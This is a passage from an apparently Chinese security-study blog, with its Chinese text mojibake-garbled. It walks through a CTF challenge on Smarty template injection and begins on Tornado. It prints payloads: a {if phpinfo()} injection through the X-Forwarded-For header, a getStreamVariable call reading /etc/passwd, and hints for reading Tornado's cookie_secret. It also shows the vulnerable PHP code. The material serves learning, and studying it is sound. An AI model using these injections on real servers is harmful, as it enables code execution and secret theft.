‡ç­¾</h5><p>å®˜æ–¹æ‰‹å†Œè¿™æ ·æè¿°è¿™ä¸ªæ ‡ç­¾ï¼š</p><blockquote><p>{literal}å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</p></blockquote><p>é‚£ä¹ˆå¯¹äºphp5çš„ç¯å¢ƒæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥å®ç°PHPä»£ç çš„æ‰§è¡Œï¼Œä½†è¿™é“é¢˜çš„é¢˜ç›®ç¯å¢ƒæ˜¯PHP7ï¼Œè¿™ç§æ–¹æ³•å°±å¤±æ•ˆäº†ã€‚</p><h4 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h4><p>é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™è¢«ç½‘ä¸Šå¾ˆå¤šæ–‡ç« é‡‡ç”¨ã€‚</p><p>Smartyç±»çš„getStreamVariableæ–¹æ³•çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶è¿”å›å…¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨selfæ¥è·å–Smartyå¯¹è±¡å¹¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¾ˆå¤šæ–‡ç« é‡Œç»™çš„payloadéƒ½å½¢å¦‚ï¼š{self::getStreamVariable(â€œfile:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdâ€)}ã€‚ç„¶è€Œä½¿ç”¨è¿™ä¸ªpayloadä¼šè§¦å‘æŠ¥é”™å¦‚ä¸‹ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(â€˜file:///etc/passwdâ€™)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  is undefined or not allowed by security setting &lt;-- thrown in  <span class="regexp">/var/</span>www<span class="regexp">/html/</span>smarty<span class="regexp">/libs/</span>sysplugins/smarty_internal_templatecompilerbase.php on line <span class="number">12</span></span><br></pre></td></tr></table></figure><p>å¯è§è¿™ä¸ªæ—§ç‰ˆæœ¬Smartyçš„SSTIåˆ©ç”¨æ–¹å¼å¹¶ä¸é€‚ç”¨äºæ–°ç‰ˆæœ¬çš„Smartyã€‚è€Œä¸”åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤ã€‚å¯¹äºé‚£äº›æ–‡ç« æåˆ°çš„åˆ©ç”¨ Smarty_Internal_Write_File ç±»çš„writeFileæ–¹æ³•æ¥å†™shellä¹Ÿç”±äºåŒæ ·çš„åŸå› æ— æ³•ä½¿ç”¨ã€‚</p><h5 id="if-æ ‡ç­¾"><a href="#if-æ ‡ç­¾" class="headerlink" title="{if}æ ‡ç­¾"></a>{if}æ ‡ç­¾</h5><p>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š</p><blockquote><p>Smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„if éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}. ä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}. </p><p>å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œ<br>å¦‚*||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰</p></blockquote><p>æ—¢ç„¶å…¨éƒ¨çš„PHPå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å‘¢ï¼Ÿ</p><p>å°†XFFå¤´æ”¹ä¸º{if phpinfo()}{&#x2F;if}ï¼Œå¯ä»¥çœ‹åˆ°é¢˜ç›®æ‰§è¡Œäº†phpinfo()</p><p><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></p><p>ç”¨åŒæ ·çš„æ–¹æ³•å¯ä»¥è½»æ¾è·å¾—flag</p><p>é¢˜ç›®æ¼æ´ä»£ç </p><p>é€šè¿‡getshellä¹‹åçš„æ–‡ä»¶è¯»å–ï¼Œæœ¬é¢˜ä¸­å¼•å‘SSTIçš„ä»£ç ç®€åŒ–åå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨å­—ç¬¦ä¸²ä»£æ›¿smartyæ¨¡æ¿ï¼Œå¯¼è‡´äº†æ³¨å…¥çš„Smartyæ ‡ç­¾è¢«ç›´æ¥è§£ææ‰§è¡Œï¼Œäº§ç”Ÿäº†SSTIã€‚</p><h3 id="Tornado-SSTIåˆ©ç”¨"><a href="#Tornado-SSTIåˆ©ç”¨" class="headerlink" title="Tornado SSTIåˆ©ç”¨"></a>Tornado SSTIåˆ©ç”¨</h3><p><strong>tornadoæ˜¯ç”¨Pythonç¼–å†™çš„WebæœåŠ¡å™¨å…¼Webåº”ç”¨æ¡†æ¶</strong>ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç”¨æ¥ç”Ÿæˆæ¨¡æ¿çš„ä¸œè¥¿ã€‚å’ŒPythonç›¸å…³ï¼Œå’Œæ¨¡æ¿ç›¸å…³</p><blockquote><p> Tornadoæ¨¡æ¿æ”¯æŒæ§åˆ¶è¯­å¥å’Œè¡¨è¾¾å¼ã€‚</p><p> æ§åˆ¶è¯­å¥è¢«{ % % }, e.g. { % if len(items) &gt; 2 %}</p><p> è¡¨è¾¾å¼è¢«{ { } }, e.g. { { items[0] } }.</p></blockquote><p><strong>render()<strong>æ˜¯tornadoé‡Œçš„å‡½æ•°ï¼Œ</strong>å¯ä»¥ç”Ÿæˆhtmlæ¨¡æ¿ã€‚æ˜¯ä¸€ä¸ªæ¸²æŸ“å‡½æ•°</strong>ï¼Œå°±æ˜¯ä¸€ä¸ªå…¬å¼ï¼Œ<strong>èƒ½è¾“å‡ºå‰ç«¯é¡µé¢çš„å…¬å¼ã€‚</strong></p><p><strong>Tornado</strong>æ¡†æ¶çš„é™„å±æ–‡ä»¶<strong>handler.settings</strong>ä¸­å­˜åœ¨<strong>cookie_secret</strong></p><p><strong>Handler</strong>è¿™ä¸ªå¯¹è±¡ï¼Œ<u>HandleræŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡</u></p><blockquote><p><code>RequestHandler</code>ä¸­å¹¶æ²¡æœ‰settingsè¿™ä¸ªå±æ€§ï¼Œä¸RequestHandlerå…³è”çš„Applicationå¯¹è±¡ï¼ˆRequestion.applicationï¼‰æ‰æœ‰settingè¿™ä¸ªå±æ€§</p><p>handler æŒ‡å‘RequestHandler</p><p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p><p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
